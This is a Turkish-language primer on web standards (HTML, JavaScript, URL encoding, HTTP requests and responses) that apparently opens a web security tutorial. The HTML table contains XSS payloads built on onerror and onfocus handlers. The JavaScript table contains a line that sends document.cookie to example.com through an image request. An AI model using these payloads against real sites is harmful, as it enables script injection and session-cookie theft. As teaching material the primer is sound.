# Web Standartları

## HTML

WEB’in temelini oluşturan içerik ve yapı sunma dilidir.

| <p><strong>&#x3C;p> Bu bir paragraftır &#x3C;/p></strong></p><p><strong>&#x3C;script src=”</strong><a href="http://example.com/abc.jpg"><strong>http://example.com/abc.jpg</strong></a><strong>”>&#x3C;/script></strong></p><p><strong>&#x3C;img src=”” onerror=”prompt()”/></strong></p><p><strong>&#x3C;input onfocus=alert(1) autofocus></strong></p> |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

HTML içerisinde birçok farklı özellik bulunur. Bunların örneklerini aşağıda bulabilirsiniz.

| **HTML Element**       | **\<div>...\</div>**         |
| ---------------------- | ---------------------------- |
| **HTML Attribute**     | **\<div id=...>**            |
| **HTML JavaScript**    | **\<div onmouseover=”...”>** |
| **HTML URL Attribute** | **\<script src=”..”>**       |

HTML dilinde birçok **özel karakter** bulunmaktadır. Bu karakterlerin kaynak kodda yazılması durumunda tarayıcı bunları göstermeyecek, HTML olarak yorumlamaya çalışacaktır. Bu özel karakterlerin tarayıcıda gösterilmesini gerektiren durumlarda, tarayıcının bunları özel karakter olarak algılamaması için **HTML kodlama** kullanılır. Aşağıda iki özel karakterin onluk ve onaltılık HTML kodlama karşılıkları verilmiştir. Bu değerler yazıldığında tarayıcıda ilgili karakterin ekrana çıktı olarak verildiği görülebilir.

| **Karakter** | **HTML Kodlama (Ondalık)** | **HTML Kodlama (On altılık)** |
| ------------ | -------------------------- | ----------------------------- |
| **<**        | **\&#60**                  | **\&#x003C**                  |
| **“**        | **\&#34**                  | **\&#0022**                   |

## Javascript

Javascript WEB 2.0 fenomeninin temelini oluşturur.

| <p><strong>var f = function(t) {return t*t};</strong></p><p><strong>f.myvar = 3;</strong></p><p><strong>alert(f(5));</strong></p><p> <strong></strong> </p><p><strong>var i = new Image();</strong></p><p><strong>var c = document.cookie;</strong></p><p><strong>i.src = “</strong><a href="http://example.com/i"><strong>http://example.com/i</strong></a><strong>?” + c;</strong></p> |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

HTML dilinde de olduğu gibi JS dilinde de özel karakterler bulunur ve bunların JS kodu olarak algılanmayıp ekranda gösterilebilmesi için tırnak içinde alınan Javascript değerlerinin **\xHH** formatında **Javascript kodlaması** yapılır.

| **Karakter** | **Javascript Kodlama** |
| ------------ | ---------------------- |
| **<**        | **\x3c**               |
| **“**        | **\x22**               |

## URL

URL, Web’de bulunan dokümanlara ve diğer kaynaklara ulaşılmasını sağlayan adresleme standardıdır. Tipik bir URL formatı aşağıdaki gibidir.

| <p><mark style="color:red;"><strong>scheme</strong></mark><strong>://</strong><mark style="color:orange;"><strong>host</strong></mark><strong>:</strong><mark style="color:purple;"><strong>port</strong></mark><strong>/</strong><mark style="color:blue;"><strong>path</strong></mark><strong>?</strong><mark style="color:green;"><strong>parameter=value</strong></mark><strong>&#x26;#anchor</strong></p><p> <strong></strong> </p><p><mark style="color:red;"><strong>https</strong></mark><strong>://</strong><mark style="color:orange;"><strong>example.com</strong></mark><strong>:</strong><mark style="color:purple;"><strong>8090</strong></mark><strong>/</strong><mark style="color:blue;"><strong>index.php</strong></mark><strong>?</strong><mark style="color:green;"><strong>id=admin</strong></mark><strong>&#x26;#anchor</strong></p> |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

URL içerisinde özel karakterleri gönderebilmek için **%HH** formatında **URL kodlama** yapılır.

## HTTP

İnternet üzerinden dokümanların transfer edilme standardıdır. Bugüne kadar 4 versiyonu resmi olarak yayınlanmıştır. HTTP 3 henüz taslak halindedir.

* HTTP 0.9
* HTTP 1.0
* HTTP 1.1
* HTTP 2

HTTP protokolünde kullanılabilecek çok sayıda metot vardır. Bunların bazıları (**DEBUG, TRACE vb.**) sunucu ya da uygulama işleyişi hakkında bilgi vermesi nedeniyle güvenli kabul edilmez ve **canlı sistemlerde kullanılmamaları** gerekir. Doküman almak için kullanılan HTTP istekleri **GET** ve **POST** yöntemleridir.

**HTTP GET** isteklerinde parametre ve aldıkları değerler URL içerisinde bulunur. Bu nedenle kimlik doğrulama gibi **kritik verilerin gönderileceği uygulamalarda kullanılmaması gerekmektedir**.

**Örnek bir HTTP GET İsteği:**

| <p><strong>GET /index.jsp HTTP/1.1</strong></p><p><strong>User-Agent: Mozilla/4.0 (MSIE 6.0, …</strong></p><p><strong>Host: example.com</strong></p><p> <strong></strong> </p> |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |

**Örnek bir HTTP POST İsteği:**

| <p><strong>POST /login.jsp HTTP/1.1</strong></p><p><strong>User-Agent: Mozilla/4.0 (MSIE 6.0, ..</strong></p><p><strong>Host: example.com</strong></p><p><strong>Proxy-Connection: Keep-Alive</strong></p><p><strong>Content-Type: application/x-www-form-urlencoded</strong></p><p><strong>Content-Length: 30</strong></p><p> <strong></strong> </p><p><strong>login=webappsec&#x26;passwd=S3cretPa$$w0rd!</strong></p> |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |

Sunucu HTTP isteklerine, HTTP yanıtlar ile cevap verir. HTTP cevaplarının belirli anlamlara gelen [durum kodları](https://en.wikipedia.org/wiki/List\_of\_HTTP\_status\_codes) bulunmaktadır. Örneğin, yapılan istek karşılığında sunucu istenilen dosya sorunsuz olarak bulundu ise **200 OK**, istenilen dosya bulunamadı ise **404 Not Found** cevabı dönecektir.

**Örnek bir HTTP Yanıtı:**

| <p><strong>HTTP/1.1 200 OK</strong></p><p><strong>Date: Fri, 31 Mar 2012 10:08:00 GMT</strong></p><p><strong>Server: Apache/2.47</strong></p><p><strong>Content-Length: 92</strong></p><p> <strong></strong> </p><p><strong>&#x3C;html></strong></p><p><strong>&#x3C;head>&#x3C;/head>&#x3C;body>...&#x3C;/html></strong></p> |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |

Saldırganlar, HTTP istek paketlerini manipüle ederek, uygulamanın amacı dışında çalışmasını amaçlar.
